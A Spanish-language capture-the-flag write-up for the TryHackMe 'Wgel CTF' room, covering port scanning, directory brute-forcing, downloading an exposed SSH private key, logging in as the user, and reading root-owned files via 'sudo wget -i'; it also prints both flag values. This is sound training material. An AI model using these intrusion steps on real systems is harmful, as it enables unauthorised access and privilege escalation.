# Wgel CTF — TryHackMe

![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=flat)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=flat)
![Status](https://img.shields.io/badge/Status-Completed-blue?style=flat)

> **Fecha:** 26/04/2026
> **Autor:** [Josue Rendón](https://github.com/Slasho01)
> **Room:** [Wgel CTF](https://tryhackme.com/room/wgelctf)

---

## 📋 Descripción

Room de dificultad fácil que cubre enumeración web en múltiples niveles, descubrimiento de clave SSH privada expuesta en directorio `.ssh` público, acceso SSH y escalada de privilegios abusando de `wget` con permisos sudo para leer archivos de root.

---

## 🎯 Objetivos

- [x] Flag de usuario
- [x] Flag de root

---

## 🔍 1. Reconocimiento

### Escaneo de puertos

```bash
nmap -sC -sV <TARGET_IP>
```

**Resultado:**
```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

**Puertos relevantes:**
- `22` — SSH, objetivo de acceso
- `80` — HTTP, página por defecto de Apache

---

## 🌐 2. Enumeración

### Enumeración Web — Nivel 1

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
```

**Resultado:**
```
/index.html  (Status: 200)
/sitemap     (Status: 301)
```

**Directorio de interés:** `/sitemap`

### Usuario en código fuente

Revisando el código fuente de la página principal se encontró un comentario HTML:

```html
<!-- Jessie don't forget to update the website -->
```

**Usuario identificado:** `jessie`

### Enumeración Web — Nivel 2

```bash
gobuster dir -u http://<TARGET_IP>/sitemap -w /usr/share/wordlists/dirb/common.txt
```

**Resultado:**
```
/.ssh        (Status: 301)  ← directorio SSH expuesto
/css         (Status: 301)
/fonts       (Status: 301)
/images      (Status: 301)
/js          (Status: 301)
/index.html  (Status: 200)
```

### Clave SSH expuesta

Accediendo a `http://<TARGET_IP>/sitemap/.ssh/` se encuentra `id_rsa` — clave privada RSA expuesta públicamente:

```bash
wget http://<TARGET_IP>/sitemap/.ssh/id_rsa
chmod 600 id_rsa
```

---

## 💥 3. Explotación

### Acceso SSH con clave privada

```bash
ssh -i id_rsa jessie@<TARGET_IP>
```

Acceso obtenido como `jessie`.

---

## 🚩 4. Flag de usuario

```bash
ls ~/Documents
cat ~/Documents/user_flag.txt
```

```
057c67131c3d5e42dd5cd3075b198ff6
```

---

## ⬆️ 5. Escalada de privilegios — sudo wget

### Enumeración de sudo

```bash
sudo -l
```

```
(ALL : ALL) ALL
(root) NOPASSWD: /usr/bin/wget
```

### Vulnerabilidad identificada

> `wget` puede ejecutarse como root sin contraseña. Usando el flag `-i` wget interpreta el contenido de un archivo como lista de URLs. Al intentar resolver cada línea como URL, el contenido del archivo se expone en el mensaje de error — permitiendo leer archivos de root sin tener permisos directos.

### Explotación

```bash
sudo wget -i /root/root_flag.txt
```

**Output:**
```
--2026-04-26 06:12:16-- http://b1b968b37519ad1daa6408188649263d/
Resolving b1b968b37519ad1daa6408188649263d... failed: Name or service not known.
wget: unable to resolve host address 'b1b968b37519ad1daa6408188649263d'
```

> El hash aparece en el error porque wget intenta resolverlo como hostname — la flag queda expuesta en el output.

---

## 🚩 6. Flag de root

```
b1b968b37519ad1daa6408188649263d
```

---

## 📝 7. Lecciones aprendidas

- Siempre revisar el **código fuente** de las páginas — los comentarios HTML pueden revelar usuarios y pistas
- Enumerar subdirectorios en **múltiples niveles** — el directorio `.ssh` estaba oculto en el segundo nivel
- Un directorio `.ssh` expuesto públicamente es una vulnerabilidad crítica — expone claves de autenticación
- `wget` con permisos sudo puede usarse para **leer archivos privilegiados** explotando el flag `-i`
- Siempre verificar **GTFOBins** para cualquier binario con permisos sudo

---

## 🔗 Referencias

- [GTFOBins — wget](https://gtfobins.github.io/gtfobins/wget/)
- [HackTricks — SSH](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh)

---

*Write-up por [Josue Rendón](https://github.com/Slasho01) · [TryHackMe Profile](https://tryhackme.com/p/Slasho)*
